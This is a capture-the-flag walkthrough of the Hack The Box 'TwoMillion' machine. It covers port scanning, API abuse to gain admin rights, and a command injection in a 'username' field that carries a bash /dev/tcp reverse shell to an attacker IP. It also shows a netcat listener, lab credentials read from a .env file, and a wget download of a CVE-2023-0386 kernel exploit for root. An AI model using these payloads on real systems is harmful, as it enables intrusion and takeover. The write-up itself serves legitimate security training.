Scan - min-rate is very fast and can crash shitty home nodes/devices.

```
sudo nmap -p- --min-rate=10000 -oA nmap/twomillion-allports -v <machine>

Increasing send delay for 10.10.11.221 from 0 to 5 due to 1086 out of 3618 dropped probes since last increase.
Increasing send delay for 10.10.11.221 from 5 to 10 due to 508 out of 1693 dropped probes since last increase.
Warning: 10.10.11.221 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.221
Host is up (0.34s latency).
Not shown: 48931 closed tcp ports (reset), 16602 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Next vulnerability scan:

```
sudo nmap -v -p22,80 -sV -sC -oA twomillionv 10.10.11.221

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Create an entry in a host file:

```
10.10.11.221 2million.htb
```

Using feroxbuster to scan down the web:

```
feroxbuster -u 2million.htb
```

JS from /invite/inviteapi.min.js

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Make some sense of it with https://beautifier.io/

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

POST the API with curl:

```
curl -X POST 2million.htb/api/v1/invite/how/to/generate | jq .

{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Upon simple ROT13 decoding: In order to generate the invite code, make a POST request to /api/v1/invite/generate

curl POST for base64 decode -> MXQ0T-HK4G6-X00KC-P5BPI

OR:
```
curl -s -q -X POST 2million.htb/api/v1/invite/generate | jq .data.code -r | base64 -d;echo
```

Fire up **Burp** and dig trough API request. First intercept and then check the route via /api/v1. To get the full list:

```
curl -s -q 2million.htb/api/v1 -H "Cookie: PHPSESSID=r6g2qrgdqircd9u4o0munq2euj" | jq .
```

There is a possibility to **change my role to admin**.
PUT /api/v1/admin/settings/update - an **IDOR Vulnerability**:
https://www.varonis.com/blog/what-is-idor-insecure-direct-object-reference

```
PUT /api/v1/admin/settings/update HTTP/1.1
...
Content-type: application/json
Cookie: PHPSESSID=r6g2qrgdqircd9u4o0munq2euj
...
{"email": "adam.dekan@gmail.com", "is_admin" : 1 }
```

The next step is to create a **command injection** via "username" which can be basically any username()

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Length: 72
Content-Type: application/json
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2million.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=qnbchmjm5n6m6nttdgfn6dmbv8
Connection: close

{
"username":"a$(bash -c 'bash -i >& /dev/tcp/10.10.16.70/9001 0>&1')"}
```

It attempts to establish a reverse shell by redirecting the input and output streams of the `bash` shell to a TCP/IP connection.

Let's break down the command:

- `bash`: Launches an interactive instance of the Bash shell.
- `-i`: Specifies that the Bash shell should run in interactive mode, allowing for interactive input and output.
- `>&`: Redirects both the standard output (stdout) and standard error (stderr) streams.
- `/dev/tcp/10.10.16.70/9001`: This is a special file in Linux that represents a TCP/IP connection. It specifies the IP address (`10.10.16.70`) and port (`9001`) to which the shell's output will be redirected.
- `0>&1`: Redirects the standard input (stdin) stream to the same TCP/IP connection, ensuring that input and output are both sent over the network connection.

By executing this command, if a network connection is successfully established to the specified IP address and port, the remote machine will have an interactive shell through which it can send commands and receive responses.

On my end I have to **start listening** with `nc -lvnp 9001`

- `-l`: This option instructs netcat to operate in listening mode, waiting for incoming connections.
- `-v`: This option enables verbose output, providing more detailed information about the connections and data transfers.
- `-n`: This option disables DNS resolution, preventing netcat from attempting to resolve IP addresses to hostnames.

After **connection** is established I need to spawn a proper bash with `pyhon3 -c 'import pty;pty.spawn(/bin/bash)'`

It's a good practice now to to put bash into background with <Ctrl+Z>
and modify the terminal settings to **raw output without echoing** to make the output unprocessed and invisible with
`stty raw -echo;fg`

With `ls` explore the www-data and find Database.php which points to environment variables. In a file .env is stored login and password that works also for ssh:

admin
SuperDuperPass123

After searching the filesystem:
`find / -user admin 2>/dev/null | grep -vE '^/(sys|proc|run)/'`

Inside /var/mail/admin there is a hint of unfixed possible exploit:
https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/#user-namespace

And **proof of concept**:
https://github.com/xkaneiki/CVE-2023-0386/

I've cloned locally the Git and zipped the CVE in a www folder. With `python -m http.server` and download the exploit into admin home folder with `wget 10.10.16.70:8000/CVE`. Unzip, make and continue according to the translated information from proof of concept README.

Root accessed.

return 0